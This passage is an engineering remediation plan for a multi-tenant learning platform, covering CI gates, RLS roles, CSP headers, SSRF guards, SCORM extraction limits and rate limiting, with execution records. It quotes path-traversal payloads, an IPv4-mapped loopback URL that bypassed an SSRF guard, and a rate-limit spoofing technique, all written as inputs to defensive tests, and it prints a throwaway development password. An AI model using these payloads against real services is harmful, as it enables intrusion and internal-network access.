---
name: Security Hardening and Remediation Programme
status: draft
updated: 2026-08-19
depends-on:
  - production-deployment-and-scale.md
related:
  - ../../docs/engineering/atlas-lms-audit-2026-08-15.md
  - ../../docs/release/security-exception-register.md
  - ../frontend-planning/performance.md
---

# Security hardening and remediation programme

Execution plan for the 53 findings in
[`docs/engineering/atlas-lms-audit-2026-08-15.md`](../../docs/engineering/atlas-lms-audit-2026-08-15.md)
(6 critical · 20 high · 16 medium · 11 low).

**This plan changes no product scope.** Every item is a fix, a guard, or a configuration change to
existing behaviour. No screens, APIs, permissions, workflows or entities are introduced, so nothing
here conflicts with `docs/locked/`. The one deviation that _does_ need sign-off — hosting — lives in
[production-deployment-and-scale.md](production-deployment-and-scale.md) §5.2, not here.

---

## 1. Sequencing principle

Work is ordered by **dependency, then risk-per-unit-effort** — not by severity alone.

> **Fix the gates before the code.** Six CI jobs are red, `pnpm lint` crashes, and the RLS check
> passes on a database where isolation is trivially bypassable. Until the safety net works you
> cannot prove any subsequent fix landed, and you risk "fixing" things that were never broken while
> missing regressions you just introduced.

That is why Phase 0 is unglamorous plumbing and comes first.

Each phase ends with an **exit gate** — an objective, re-runnable check. Do not start the next
phase until the current gate is green.

---

## 2. Target security model

Today, tenant isolation rests on a **single** layer: application discipline. Master PRD §0.4 #1
promises three. The end state restores all three plus a browser-side layer:

| Layer              | Control                                                       | Today                         | After       |
| ------------------ | ------------------------------------------------------------- | ----------------------------- | ----------- |
| **Browser**        | CSP, `nosniff`, frame-ancestors, sandbox origin, Origin check | **none**                      | Phase 1 + 2 |
| **Application**    | `withTenantTx`, `can()`, entitlements, Zod                    | **working** (the only layer)  | unchanged   |
| **Database**       | RLS as a _backstop_                                           | **inert** — app role bypasses | Phase 2     |
| **Infrastructure** | WAF, edge rate limiting, network egress policy                | **none**                      | Phase 2 + 4 |

The single most valuable structural change in this plan is **making RLS actually enforce** (2.1).
It converts every future missed `withTenantTx` from a data breach into a failed query.

---

## 3. Phase 0 — Restore the safety net

**Goal:** every gate runs and tells the truth. **Effort:** ~1 day. **Blocks everything else.**

### 0.1 Fix the ESLint out-of-memory crash — H19

`pnpm lint` aborts with SIGABRT (exit 134). CI runs it with no heap flag.

```jsonc
// package.json
"lint": "cross-env NODE_OPTIONS=--max-old-space-size=8192 eslint . --max-warnings=0",
```

If that is still not enough, lint per-package (`pnpm -r lint`) so each workspace gets its own heap.
Then work the backlog it exposes — **12 errors are already known from 4 of ~25 packages**, including
the always-true MFA predicate (3.1).

### 0.2 Give the RLS job a database — H9

The `rls-tests` job has no Postgres service, so `check-rls-state.ts` exits 1 every run, and `build`
depends on it. Add the same `services: postgres` block the other DB jobs use, plus
`DATABASE_URL: ${{ env.CI_DATABASE_URL }}`.

### 0.3 Fix two stale pre-restructure paths — H10, H14

| File                                      | Wrong                                    | Correct                       |
| ----------------------------------------- | ---------------------------------------- | ----------------------------- |
| `scripts/ci/check-permission-metadata.ts` | `packages/domain/src/...`                | `backend/packages/domain/...` |
| `scripts/guards/check-migrate-status.mjs` | `join(repoRoot, "prisma", "migrations")` | `backend/prisma/migrations`   |

**Also make both fail loudly.** `check-migrate-status.mjs` currently returns `[]` on a missing
directory and exits 0 — a guard that cannot find its input must error, never skip:

```js
if (migrationDirectories.length === 0) {
  console.error(`No migrations found at ${migrationsDir} — expected at least one.`);
  process.exit(1);
}
```

### 0.4 Fix the `.gitignore` generated path — L9

```diff
- packages/db/src/generated/
- packages/**/src/**/*.d.ts
- packages/**/tsconfig.tsbuildinfo
+ backend/packages/db/src/generated/
+ backend/packages/**/src/**/*.d.ts
+ backend/packages/**/tsconfig.tsbuildinfo
```

Then `git rm -r --cached backend/packages/db/src/generated` once. This alone removes the ~30k-line
diffs that currently drown every code review.

### 0.5 Sweep for remaining restructure debt — L10

`grep -rn "packages/\|prisma/migrations" scripts/ .github/ *.json *.mjs` and fix every
pre-restructure path. Delete the orphaned root `packages/`, `apps/`, `src/`, `runbooks/`.

### 0.6 Refresh the test database in CI — H12

`atlas_lms_test` was stale enough to lack `proctoring_sessions` — meaning the L2/L3 proctoring
isolation tests had never run against those tables. CI must rebuild the schema before isolation
tests, not reuse a snapshot.

### 0.7 Triage the 43 failing tests — H12, H13

Split them: genuine regressions get fixed; **source-text assertions get rewritten or deleted.**
A test that greps a page for the string `403` proves nothing and creates false confidence — see 3.6.

> **Exit gate 0:** `pnpm lint` completes. All 8 CI jobs green. `pnpm ci` runs end to end.
> `db:migrate:check` reports 99 migrations, not "no migrations yet".

### Phase 0 correction (2026-08-17) — 0.4 was only half done

The table above claimed "229 files removed from the index". **It was not.** The `.gitignore` rule
was added and is correct, but `git rm -r --cached backend/packages/db/src/generated` was never run,
and `.gitignore` has no effect on files git already tracks. A verification pass found all 229 still
tracked with 15 of them dirty — exactly the review-drowning churn L9 existed to stop.

`git check-ignore` is what made this easy to miss: on a tracked file it reports nothing, which reads
like "no rule matches". Only `--no-index` shows the rule was there all along.

Now actually done: 229 untracked, 235 files still on disk, `postinstall` regenerates them, and
`git check-ignore` reports the rule. Typecheck passes.

**Also still open from Phase 0:** `src/` and `runbooks/` remain at the repo root, each holding a
`.gitkeep`. 0.5 said to delete them; the `.gitkeep` suggests someone kept them deliberately, so this
needs a decision rather than a fix.

### Phase 0 execution record (2026-08-15)

Phase 0 is **implemented**. What it actually took differed from the estimate above, because
fixing each broken gate exposed defects the gate had been hiding.

**Delivered**

| Item                                                                       | Result                                                  |
| -------------------------------------------------------------------------- | ------------------------------------------------------- |
| Sharded lint (`scripts/ci/run-lint.mjs`) + coverage guard                  | Completes without OOM; peak ~3 GB vs 6 GB thrash        |
| `rls-tests` CI job                                                         | postgres service + provisioning + non-vacuous check     |
| `check-rls-state.ts` vacuity guard                                         | Refuses to pass below 200 tenant tables                 |
| `check-migrate-status.mjs`                                                 | Path, `--config`, and fail-loudly all fixed             |
| `check-permission-metadata.ts`                                             | Path + `route.metadata` filter; positive-controlled     |
| `check-sql-approved-paths.mjs`                                             | Now actually scans `backend/prisma`                     |
| `check-forbidden-scope.mjs`                                                | Covers backend/ and frontend/ locations                 |
| `check-no-direct-prisma.ts` / `check-no-platform-scope-outside-wrapper.ts` | Allowlists corrected; type-only imports exempted        |
| `.gitignore` + untracked generated client                                  | `.gitignore` fixed; see the 2026-08-17 correction below |
| `pnpm db:provision`                                                        | **First working path from empty DB to full schema**     |
| DB test jobs                                                               | `integration`/`tenant-isolation`/`e2e` now provision    |
| Entitlement metadata (5 routes), audit metadata (2 platform routes)        | Declared; guards pass                                   |

**Defects found only because the gates started working**

1. **No reproducible database provisioning existed.** `prisma migrate deploy` failed on any clean
   database — migration 098 calls `app.reject_update_delete()`, defined only in `sql/triggers/006`,
   which cannot run until migrations create its tables. That circular dependency is why the test
   database was built by `pg_dump`-cloning dev. Fixed by moving the function into `sql/setup`.
2. **`app.verify_audit_chain()` was never deployed anywhere**, despite
   `audit-chain.service.ts:20` calling it — `sql/functions/` was missing from both the applier and
   the approved-paths guard. Audit-log tamper detection was inert in every environment.
3. **9 admin pages have no server-side denied handling** (audit M17) — surfaced by
   `admin-pages.test.ts` T52–T57, which was correctly failing.
4. **544+ lint errors** in the first three shards alone, previously hidden by the OOM crash.

**Deliberately not done, with reasons**

- **`branding/assets/upload` audit metadata.** The handler writes no audit entry, so declaring
  `audit: "required"` would be a false claim in metadata. Implementing the write is Phase 1.
- **9 admin pages (M17).** Converting them to server-side fetch with denied handling is feature
  work, not gate plumbing.
- **3 product-decision test failures** — studio shell `href="/admin"`, moderation "Decision
  history", studio "AnalyticsDashboard". These encode product expectations that changed; resolving
  them needs a product call, not a test edit.
- **The lint backlog itself.** The gate now runs and reports honestly; clearing 544+ errors is
  its own workstream.

**Revised view:** Phase 0 was scoped at ~1 day. Restoring the gates took roughly that, but the
defects they exposed — particularly items 1 and 2 — were more serious than anything Phase 0 was
expected to find. The premise held: **you cannot trust any other gate while the gates themselves
are broken.**

### Post-implementation verification (self-check)

A deliberate re-audit of the Phase 0 work itself found **one defect I introduced** and four
further stale paths.

**Defect introduced and fixed.** The first sharding implementation used `backend/apps` and
`backend/packages` as shards, silently dropping `backend/prisma/seeds/**` (12 files) and
`backend/prisma.config.ts` — files a plain `eslint .` would have linted. The original coverage
guard did not catch it because it compared **top-level directories**, so it saw "backend is
covered" while the shards were sub-paths. Fixed by:

- rewriting `check-lint-coverage.mjs` to walk the real file tree and consult **ESLint's own**
  `isPathIgnored`, so it verifies coverage per file and cannot drift from ESLint's config;
- extracting the shard list into `scripts/ci/lint-shards.mjs`, shared by the runner and the guard
  so they cannot disagree.

**Four more stale F-1 paths, found only once those files were actually linted:**

| Location                                                 | Effect                                                          |
| -------------------------------------------------------- | --------------------------------------------------------------- |
| `eslint.config.mjs` `prisma/seeds/**`                    | Seeds exemption dead → false `no-hardcoded-tenant-strings` hits |
| `eslint.config.mjs` `packages/tenant-config/**`          | Exemption dead for the package that _is_ tenant config          |
| `eslint.config.mjs` `packages/release-readiness/**` (×2) | Exemption + `disableTypeChecked` both dead                      |
| `eslint.config.mjs` `prisma.config.ts`                   | Ignore missed `backend/prisma.config.ts` → parse error          |

`.agents/**`, `.claude/**` and `frontend/ui_reference/**` were also added to ESLint's ignores:
`eslint .` had been linting vendored agent-skill starter templates and an extracted HTML asset,
which was never intended and added avoidable work to a memory-bound lint.

**`db:provision` was not idempotent.** Running it against an already-populated database (such as
`atlas_lms_test`, which `db:test:setup` builds by pg_dump-cloning dev) failed mid-migration and
left a failed-migration marker. The test database was rebuilt, and the script now refuses to run
against a non-empty database with a message pointing at the right alternative.

### Honest exit-gate status

The gate as written was: _"`pnpm lint` completes. All 8 CI jobs green. `pnpm ci` runs end to end.
`db:migrate:check` reports 99 migrations."_

| Criterion                     | Status                                                   |
| ----------------------------- | -------------------------------------------------------- |
| `pnpm lint` completes         | **Met** — 8 shards, no OOM (peak ~3 GB vs 6 GB thrash)   |
| `db:migrate:check` reports 99 | **Met**                                                  |
| All CI jobs green             | **Not met** — lint and format-check report real backlogs |
| `pnpm ci` runs end to end     | **Not met** — stops at step 1 (`pnpm lint`)              |

**The gates now work; they are red because the codebase is.** Current honest totals:

- **1,797 lint errors** across 6 shards (`backend/prisma` and `scripts` are clean). Restoring the
  three dead exemptions removed 3; the rest is real backlog that the OOM crash had hidden.
- **1,160 files fail `format:check`** — pre-existing and unrelated to this work, confirmed by
  running Prettier against a pristine file at `HEAD`. This makes **9** red CI jobs, not 8.
- **1 route** still fails `ci:audit-metadata` (`branding/assets/upload`), deliberately.

Clearing those backlogs is its own workstream and should not be smuggled into Phase 0. What Phase 0
promised — that every gate runs and tells the truth — is delivered and independently re-verified.

---

## 4. Phase 1 — Stop the proven bleeding

**Goal:** close everything demonstrated to be exploitable. **Effort:** ~3–4 days.

Each item below was **proven against the running system**, and each has a re-runnable proof that
must flip from "exploited" to "blocked."

### 1.1 Security headers and CSP — H2 _(highest value per line of code)_

Measured on a live response: all six controls absent. This single change removes the second-stage
impact of both XSS vectors, clickjacking, and MIME sniffing.

```ts
// next.config.ts — BOTH apps
async headers() {
  return [{
    source: "/:path*",
    headers: [
      { key: "Content-Security-Policy", value: [
          "default-src 'self'",
          "script-src 'self'",              // tighten with nonces once inline scripts are audited
          "style-src 'self' 'unsafe-inline'",
          "img-src 'self' data: https:",
          "frame-ancestors 'none'",
          "base-uri 'self'",
          "form-action 'self'",
          "object-src 'none'",
        ].join("; ") },
      { key: "X-Content-Type-Options", value: "nosniff" },
      { key: "X-Frame-Options", value: "DENY" },
      { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
      { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
      { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains; preload" },
    ],
  }];
}
```

**Caution — two places need care.** `ThemeInitScript.tsx` injects an inline script, and proctoring
needs `camera`/`microphone`. Roll out `Content-Security-Policy-Report-Only` first, collect
violations for a week, then enforce. Do **not** weaken to `'unsafe-inline'` on `script-src` —
that defeats the entire purpose against H1.

### 1.2 Atomic wallet mutations — C2

_Proven: 5 concurrent spends of 100 credits from a 100-credit wallet; final balance 0._

Replace read-compute-absolute-write with a single conditional atomic update:

```sql
update sales_wallets
   set balance_credits = balance_credits - $1,
       used_credits    = used_credits + $1,
       updated_at      = now()
 where id = $2::uuid
   and balance_credits >= $1        -- the guard IS the update
returning balance_credits;
```

Zero rows returned means insufficient balance — reject. Compute `balance_after` for the ledger from
the `RETURNING` value, never from the pre-read. Apply the same shape to the credit path and to
`gamification` point ledgers.

### 1.3 Enforce coupon limits in the database — C3

_Proven: 5 redemptions of a 100%-off coupon against `total_usage_limit = 1`._

Application check-then-act cannot be made safe by ordering. Enforce in Postgres:

```sql
-- per-learner limit: a real constraint
create unique index sales_coupon_redemptions_per_learner_uq
  on sales_coupon_redemptions (tenant_id, coupon_id, membership_id);
```

For `total_usage_limit`, take a row lock on the coupon before counting:

```sql
select total_usage_limit from sales_coupons where id = $1::uuid for update;
```

Then count and insert inside the same transaction. Handle the unique-violation error as a clean
409 rather than a 500.

### 1.4 Bound SCORM extraction and patch `adm-zip` — C4

_Proven: a 199.5 KB archive materialised 200 MB (1026×). At the configured 100 MB upload limit that
is ~100 GB — a guaranteed OOM of the shared instance._

1. `pnpm up adm-zip@^0.6.0` (closes GHSA-xcpc-8h2w-3j85)
2. Enforce limits **before** materialising anything:

```ts
const MAX_ENTRIES = 2_000;
const MAX_FILE_BYTES = 25 * 1024 * 1024;
const MAX_TOTAL_BYTES = 250 * 1024 * 1024;

const entries = zip.getEntries().filter((e) => !e.isDirectory);
if (entries.length > MAX_ENTRIES) throw new Error("SCORM_TOO_MANY_ENTRIES");

let total = 0;
for (const e of entries) {
  if (e.header.size > MAX_FILE_BYTES) throw new Error("SCORM_ENTRY_TOO_LARGE");
  total += e.header.size; // declared size, checked before extraction
  if (total > MAX_TOTAL_BYTES) throw new Error("SCORM_PACKAGE_TOO_LARGE");
}
```

Use `entry.header.size` (the declared uncompressed size) so the check happens **before** any
`getData()` call. Longer term, stream entries to storage instead of holding the whole package in
memory.

### 1.5 Fix the SCORM path-traversal guard — M4

_Proven: `....//secret`, `..././secret`, and `....\/secret` all escape the module prefix._

Single-pass replacement is always bypassable. Reject rather than sanitise:

```ts
function safeRelativePath(input: string): string {
  const normalised = input.replace(/\\/g, "/").replace(/^\/+/, "");
  const segments = normalised.split("/");
  if (segments.some((s) => s === ".." || s === "." || s === "")) {
    throw new Error("SCORM_INVALID_PATH");
  }
  return segments.join("/");
}
```

### 1.6 Remove the nested transaction — C6 _(highest throughput win)_

_Measured: 0 requests succeed at 20 concurrent (10s stall, pool deadlock); 364 rps at 80 concurrent
once un-nested._

In `create-tenant-route.ts`, each request opens `withGlobalDb` **and** `withTenantTx`, holding two
pool connections. Three changes, in order:

1. **Move `requireSupabaseUser` outside `withGlobalDb`** — it makes up to three Supabase HTTPS
   calls while pinning a database connection.
2. **Do not nest.** Resolve tenant + principal, close that connection, then open the tenant
   transaction.
3. **Drop the MFA probe** (`setSession` + `listFactors`) until MFA is enforced — two network
   round trips per request computing a value nothing reads (H5).

Then collapse the five sequential setup statements in `withTenantTx` into one round trip:

```ts
await tx.$executeRaw`
  select set_config('app.tenant_id', ${ctx.tenantId}, true),
         set_config('app.actor_membership_id', ${ctx.actorMembershipId ?? ""}, true),
         set_config('app.request_id', ${ctx.requestId}, true),
         set_config('statement_timeout', ${String(statementTimeoutMs)}, true)
`;
```

`SET LOCAL ROLE` must remain its own statement. **Re-run the load probe after each step** — this is
the one change where a mistake silently reintroduces the deadlock.

> **Exit gate 1:** re-run the wallet, coupon, zip-bomb, traversal and load probes from the audit.
> All must fail to reproduce. Live header probe returns all six controls.

### Phase 1 execution record (2026-08-15)

**Exit gate met.** Every probe that previously reproduced an exploit now fails to reproduce it,
and the live header probe returns all six controls.

| Probe (audit)          | Before                                        | After                                      |
| ---------------------- | --------------------------------------------- | ------------------------------------------ |
| Wallet double-spend    | 5/5 spends of 100 from a 100-credit wallet    | **1 spend, 4 rejected, balance 0**         |
| Coupon over-redemption | 5 redemptions against `total_usage_limit = 1` | **1 redemption, 4 rejected**               |
| Zip bomb               | 199.5 KB → 200 MB resident                    | **rejected, 0 MB rss growth**              |
| Path traversal         | 3 payloads escaped the module prefix          | **all rejected; legitimate packages pass** |
| Load @ 20 concurrent   | 0 ok / 20 FAIL / 10.1 s stall                 | **20 ok, 192 rps**                         |
| Load @ 80 concurrent   | not reachable                                 | **80 ok, 516 rps**                         |
| Live security headers  | all six absent                                | **all six present**                        |

516 rps at 80 concurrent exceeds the 364 rps projection — collapsing the `set_config` round trips
gained more than the un-nesting alone.

**Implementation notes where the work differed from the plan**

- **CSP ships Report-Only**, as planned, because `components/ThemeInitScript.tsx` renders an inline
  `<script>` that `script-src 'self'` would block. `'unsafe-inline'` was deliberately not used —
  it would defeat the entire purpose against C1/H1. Flip `CSP_ENFORCE=1` after the inline script
  gets a nonce. `Permissions-Policy` allows `camera=(self), microphone=(self)` because proctoring
  calls `getUserMedia({ video: true, audio: true })`.
- **No unique index for the coupon per-learner limit.** The plan suggested one, but
  `per_learner_limit` is an integer that may exceed 1, which a unique constraint cannot express.
  A coupon row lock is used instead, which covers both limits.
- **Enforcement moved to the redemption insert.** Coupon validation runs at price calculation, in
  an earlier transaction than fulfilment, so locking there would not protect the insert.
- **`create-platform-route.ts` had the same nesting** and got the same fix. Operator routes are
  precisely the ones that must keep working during an incident.
- **Authentication now precedes tenant resolution.** A side effect of moving `requireSupabaseUser`
  out of `withGlobalDb`: an unauthenticated request to an unknown host returns 401 rather than
  tenant-unavailable. This is preferable — it stops disclosing tenant-host existence to anonymous
  callers.
- **The MFA probe was left in place.** The plan proposed dropping `setSession` + `listFactors`, but
  once auth runs outside the connection scope those calls no longer hold a pooled connection, so
  they are a latency cost rather than a capacity one. Removing them also requires
  `upsertAuthPrincipal` to stop clobbering `mfa_enabled` with `false`, which is a data-integrity
  change better made alongside MFA enforcement in 3.1.

**Regression tests added** so none of this can silently return: zip bomb, entry-count cap, and six
traversal payloads in `tests/unit/storage/scorm-package-extract.test.ts`.

**No regressions.** unit 1234, events 18, storage 10, security 11, tests/db 14 — all pass.
authorization (9), tenant-isolation (11) and e2e (17) fail exactly as they did at the Phase 0
baseline, with identical test names.

**Also fixed in passing:** `adm-zip` upgraded to `^0.6.0`, closing GHSA-xcpc-8h2w-3j85 on the
user-supplied upload path. 27 high advisories remain in transitive build/dev dependencies (M14).

### Post-implementation verification (self-check)

Re-auditing the Phase 1 work found **one defect introduced**, **one pre-existing bug**, and one
weakness in how the fixes were originally proven.

**Defect introduced and fixed — wallet `used_credits` clobbering.** `creditWallet` took the row
lock and read `balance_credits` / `earned_credits` from the locked read, but still passed
`usedCredits: wallet.used_credits` from the _earlier, unlocked_ `ensureWallet` read. A spend
committing between those two reads would have had its `used_credits` increment rolled back by the
absolute write, breaking the `balance = earned - used` invariant. `lockWalletForUpdate` now returns
`usedCredits` as well, and the service uses it.

**Probes tested replicas, not shipped code.** The original Phase 1 proofs re-implemented the SQL
by hand, so they would have kept passing even if the shipped repository drifted.
`tests/db/wallet-coupon-concurrency.test.ts` now calls the real
`salesWalletRepository.spendCredits` and `salesCouponsRepository.lockCouponForRedemption` under
concurrency, and asserts ledger consistency (`used_credits`) rather than balance alone.

**Pre-existing bug found and fixed — `href="./index.html"` packages could never upload.**
`normalizeZipPath` stripped leading slashes and backslashes but never `.` segments, so a manifest
using the very common `href="./index.html"` produced a launch path of `./index.html` that never
matched the extracted entry `index.html`. Every such package failed with
`SCORM_LAUNCH_FILE_NOT_FOUND`. Confirmed against `git show HEAD` that this predates Phase 1.
Normalisation now drops `.` segments; `..` is still rejected outright.

**A probe result that was mis-read.** The first traversal probe reported `..../secret` as
"still escapes". It does not — `....` is an ordinary directory name and the probe was
substring-matching `..` rather than checking path segments. Re-verified with
`path.posix.normalize` containment across 16 payloads: **0 escape**, and every genuine traversal
form (`../`, `....//`, `a/../../b`, `a/./../b`, `..`, `./..`, `x/..`, `C:/`) is rejected.

**Scope checks.** Only one caller of the absolute-write `updateBalances` remains (the lock-guarded
credit path); both spend paths use atomic `spendCredits`. No other absolute writes to balance-like
columns exist. Gamification already uses `FOR UPDATE` and an append-only point ledger, so it is not
the same pattern.

**Known gap:** the `creditWallet` fix is covered by inspection and types, not by a concurrency
test — exercising it needs wallet config fixtures. Worth adding when 3.x touches wallet config.

**Post-verification state:** typecheck, all 12 runnable guards, unit (1241), tests/db (16),
storage, events and security all pass. The web app builds. authorization (9), tenant-isolation (11)
and e2e (17) remain at the Phase 0 baseline with identical test names.

---

## 5. Phase 2 — Close the architectural holes

**Goal:** restore defence in depth. **Effort:** ~1–2 weeks.

### 2.1 Connect as a non-superuser role — C5 _(the highest-leverage structural fix)_

_Proven: with `SET LOCAL ROLE atlas_app` isolation holds; without it, cross-tenant rows are
returned. The connection user is `rolsuper=true, rolbypassrls=true`._

```sql
create role atlas_app_login with login password :'pw' nosuperuser nobypassrls inherit;
grant atlas_app to atlas_app_login;
-- migrations use a separate role, per the DevOps package
create role atlas_migrator with login password :'mpw' nosuperuser nobypassrls;
```

Point production `DATABASE_URL` at `atlas_app_login` and `DIRECT_DATABASE_URL` at `atlas_migrator`.
After this, a missed `withTenantTx` returns **zero rows instead of every tenant's rows.**

**Extend the guard so this can never silently regress** — the current check passed on a database
where bypass was trivially demonstrable:

```ts
const { rows } = await client.query(
  `select rolsuper, rolbypassrls from pg_roles where rolname = current_user`,
);
if (rows[0].rolsuper || rows[0].rolbypassrls) {
  console.error("FAIL: application role can bypass RLS");
  process.exit(1);
}
```

Add a regression test asserting a cross-tenant read **fails** without the wrapper.

### 2.2 Serve SCORM from a sandbox origin — C1

SCORM content _is_ HTML and JavaScript; filtering cannot fix it. Serve it from a hostname that
holds no session cookies — `scorm.atlas-content.com` or a per-tenant equivalent — with a strict
CSP and `Content-Disposition` where possible. Embed via a sandboxed iframe:

```html
<iframe sandbox="allow-scripts" src="https://scorm-cdn.example.com/..."></iframe>
```

`allow-scripts` **without** `allow-same-origin` is the critical combination: SCORM still runs, but
it has no access to the app origin or its cookies. Until this ships, `nosniff` plus CSP (1.1) is
the interim mitigation.

### 2.3 Sanitise all rendered HTML — H1

No sanitiser exists in the repo, yet 8 `dangerouslySetInnerHTML` sites render author HTML, two on
public pages. Add DOMPurify (or `sanitize-html`) and apply at **render** time, not just save time —
existing stored rows are already unsanitised:

```ts
import DOMPurify from "isomorphic-dompurify";
const clean = DOMPurify.sanitize(post.bodyHtml, { USE_PROFILES: { html: true } });
```

Wrap it once in a shared `<SafeHtml />` component and add an ESLint rule banning raw
`dangerouslySetInnerHTML` outside that component. Marketing tracking snippets
(`site_body_html`) are deliberately arbitrary — those must move behind the CSP and a documented
tenant-admin trust boundary, not sanitisation.

### 2.4 Block SSRF — H3

_Proven: the schema accepts the cloud metadata IP, loopback, RFC1918 and IPv6 loopback._

A shared outbound fetch wrapper for all four webhook surfaces:

```ts
export async function safeOutboundFetch(rawUrl: string, init: RequestInit) {
  const url = new URL(rawUrl);
  if (url.protocol !== "https:" && url.protocol !== "http:") throw new Error("BLOCKED_PROTOCOL");
  const { address } = await dns.promises.lookup(url.hostname); // resolve, then check
  if (isPrivate(address)) throw new Error("BLOCKED_PRIVATE_ADDRESS");
  return fetch(url, { ...init, redirect: "manual" }); // never follow redirects
}
```

All three parts matter: **resolve before connecting** (defeats DNS rebinding at the first hop),
**block private ranges** including `169.254.0.0/16`, `127.0.0.0/8`, RFC1918, `::1` and IPv4-mapped
IPv6, and **`redirect: "manual"`** — otherwise an attacker-controlled public host 302s to an
internal address and defeats every check above.

### 2.5 Validate Origin on mutating requests — H20

Tenants on subdomains of one base domain are **same-site**, so `SameSite=Lax` does not separate
them. Validate once in `createTenantRoute` / `createPlatformRoute` — all mutations funnel through
those wrappers:

```ts
if (req.method !== "GET" && req.method !== "HEAD") {
  const origin = req.headers.get("origin");
  if (!origin || new URL(origin).host !== resolvedTenantHost) {
    throw new AtlasHttpError({
      code: "PERMISSION_DENIED",
      status: 403,
      message: "Invalid origin.",
    });
  }
}
```

### 2.6 Distributed rate limiting — H4

The in-process `Map` multiplies limits by instance count and resets on every deploy. Move to Redis
with a sliding window, keyed identically. Enforce the coarse public limits at Cloudflare too, so
the application tier is not the only defence. Fix the misleading `INTERNAL_ERROR` code on 429 (L4)
and add a trusted-proxy allowlist before trusting `x-forwarded-for` (L5).

### 2.7 Implement email delivery — C7

No transport library exists; `send()` logs and returns. Signup verification, password reset and
invitations are non-functional. Implement the existing `EmailProvider` interface against a real
provider, add `NOTIFICATION_EMAIL_PROVIDER` to `.env.example`, and **fail closed at boot** in
production if it is unset — the current failure mode is silent discard.

### 2.8 Build the worker entrypoint — M13

~10 outbox processors are exported and never invoked. A long-lived process (not serverless cron) —
see [production-deployment-and-scale.md](production-deployment-and-scale.md) §7.

### 2.9 Make `STORAGE_PROVIDER` fail closed — M5

It defaults to `local-fs`; a production deploy that omits it silently writes course content and
certificates to ephemeral container disk. Require `r2` when `APP_ENV=production`.

> **Exit gate 2:** RLS blocks cross-tenant reads without the wrapper. SSRF probe blocked on all
> four surfaces. Cross-tenant CSRF returns 403. A real email arrives end to end.

### Phase 2 progress record (2026-08-15)

**Delivered: 2.1, 2.4, 2.5, 2.9.** Three exit-gate criteria met; the fourth (email) is blocked on
a provider decision.

| Item                      | Evidence                                                                         |
| ------------------------- | -------------------------------------------------------------------------------- |
| 2.1 Non-superuser DB role | Probe: without `SET LOCAL ROLE`, was `rows=2 sawB=true`; now `rows=1 sawB=false` |
| 2.4 SSRF guard            | 16 payloads: 15 blocked, only the legitimate public host allowed                 |
| 2.5 Origin validation     | Sibling-subdomain mutations rejected 403; same-host allowed                      |
| 2.9 Storage fail-closed   | `APP_ENV=production` with a local provider now throws at boot                    |

**2.1 — the headline change.** `atlas_app_login` and `atlas_platform_login` are created
`NOSUPERUSER NOBYPASSRLS INHERIT` in `sql/grants/025_03_login_roles.sql`. Three properties were
verified against a live database:

1. Cross-tenant reads are isolated **even when `SET LOCAL ROLE` is omitted** — the C5 scenario.
2. With no tenant context at all, the app role sees **0 rows** (fails closed).
3. The app role **cannot assume `atlas_platform`** (`permission denied to set role`).

Property 3 drove the design: `atlas_app_login` is deliberately NOT a member of `atlas_platform`.
The platform policy is `USING (true)` and RLS policy applicability follows role membership, so
granting it would have re-opened cross-tenant reads even without superuser. Platform work already
used a separate connection (`PLATFORM_DATABASE_URL`), so it gets its own login role.

`check-rls-state.ts` now also asserts the connecting role's privileges — the previous version
passed on a database where a full bypass was trivially demonstrable, because it only inspected
table flags. It warns in development and **fails** when `APP_ENV` is production/staging or
`REQUIRE_NON_SUPERUSER_DB=1`. CI now provisions as admin and then runs the RLS check **as
`atlas_app_login` with enforcement on**, so CI mirrors production rather than proving nothing.

**2.4 — a bypass found in my own first implementation.** The initial guard matched only the dotted
IPv4-mapped spelling (`::ffff:127.0.0.1`), but WHATWG URL parsing normalises to the hex form
(`::ffff:7f00:1`), so `http://[::ffff:127.0.0.1]/` was **allowed** on the first test run. Both
spellings are now decoded. All four surfaces use `safeOutboundFetch`; the two remaining `fetch`
calls in reports use `provider.createSignedUploadUrl()` (our own R2 URLs, not tenant input) and are
correctly left alone.

**2.5 — a missing `Origin` header is deliberately allowed.** CSRF depends on a browser attaching
cookies automatically, and browsers always send `Origin` on non-GET. Rejecting a missing header
would break the mobile app and server-to-server clients for no security gain.

**Manual step — DONE locally (2026-08-17), still outstanding for CI and production.**

Local `.env.local` now connects as `atlas_app_login` / `atlas_platform_login`, so **RLS is a real
backstop in development for the first time**. Verified:

- `db:rls:check` no longer warns; the `rolsuper=true rolbypassrls=true` line is gone.
- With no tenant context the app role sees **0 rows**; with context it sees **exactly** that
  tenant's rows and no others.
- The 4 `non-superuser-rls-backstop` tests **previously skipped** because `ATLAS_APP_LOGIN_URL` was
  unset — nothing was guarding this. Now set in `.env.test`; all 4 run and pass.
- `tests/db` 16 pass and the outbox worker completes sweeps across all ten consumer groups as the
  new role, with no permission denials.

A grant audit before the switch found full SELECT/INSERT/UPDATE coverage on all 219 tenant tables.
The one apparent gap, `proctoring_events` lacking UPDATE/DELETE, is deliberate — it is append-only
and carries a `proctoring_events_append_only` trigger.

**Still to do:** CI and production have their own databases. `pnpm db:provision` creates the roles
there, but each needs its own `db:setup-login-roles` run and its own connection-string switch. The
local password is a throwaway (`beyond1234`) and must not be reused outside development.

---

### Phase 2 completion record (2026-08-17)

**All nine items delivered.** 2.2, 2.3, 2.6, 2.7 and 2.8 closed out the remainder.

| Item                          | Evidence                                                                          |
| ----------------------------- | --------------------------------------------------------------------------------- |
| 2.2 SCORM sandbox headers     | `sandbox allow-scripts allow-forms allow-popups` (opaque origin); 5 tests         |
| 2.3 HTML sanitisation         | 6 render sites moved to `<SafeHtml />`; ESLint ban with verified positive control |
| 2.6 Distributed rate limiting | Redis store + trusted-hop client IP; 23 tests                                     |
| 2.7 Email transport           | Vendor-neutral SMTP; refuses to start unconfigured in production; 10 tests        |
| 2.8 Outbox worker             | Runs against a live database, drains 10 consumer groups, exits 0 on SIGTERM       |

**2.6 — three separate defects, not one.** Beyond the per-process `Map` (F2), the limiter reported
`INTERNAL_ERROR` on a 429 (L4 — telling clients the server had broken when they should back off),
and keyed on the **first** entry of `x-forwarded-for` (L5). That entry is entirely attacker-supplied:
any client could send a random value and get a fresh bucket per request, so the limiter did nothing
against the one actor it exists to stop. The fix uses the trusted-hop model — with N proxies the
client is the Nth entry from the **right**, so an injected prefix is pushed left and ignored.

`resolveRateLimitStore` throws when `APP_ENV` is production/staging and no `REDIS_URL` is set. On a
